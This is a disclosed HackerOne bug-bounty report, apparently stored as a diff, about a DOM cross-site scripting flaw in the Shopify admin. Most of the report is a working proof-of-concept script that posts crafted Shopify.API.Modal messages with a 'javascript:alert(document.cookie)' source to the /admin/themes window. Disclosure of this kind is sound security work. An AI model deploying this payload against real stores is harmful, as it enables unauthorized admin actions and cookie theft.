@@ -1,0 +1,45 @@
+ReportLink:https://hackerone.com/reports/602767
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/tems
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:low
+State:Closed
+DateOfDisclosure:21.06.2019 18:28:11
+
+Summary:
+
+Similar #422043 & #576532
+
+Payload ( Based on #576532): 
+
+```html
+<script>
+    function attack(){
+        const ctx = window.open(location.origin+'/admin/themes', '_blank')
+        const json = {
+            message: "Shopify.API.Modal.initialize",
+            data: {
+                src: ""
+            }
+        }
+
+        let interval;
+        interval = setInterval(function(){
+            if (window.attackSuccess) {
+                clearInterval(interval)
+            } else {
+                ctx.postMessage(JSON.stringify(json)) // data.src == ""
+                json.data.src = "javascript:alert(document.cookie)"
+                ctx.postMessage(JSON.stringify(json))
+            }
+        }, 500)
+    }
+    attack()
+</script>
+<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
+```
+
+## Impact
+
+Perform unauthorized actions on a store admin on any embedded apps.
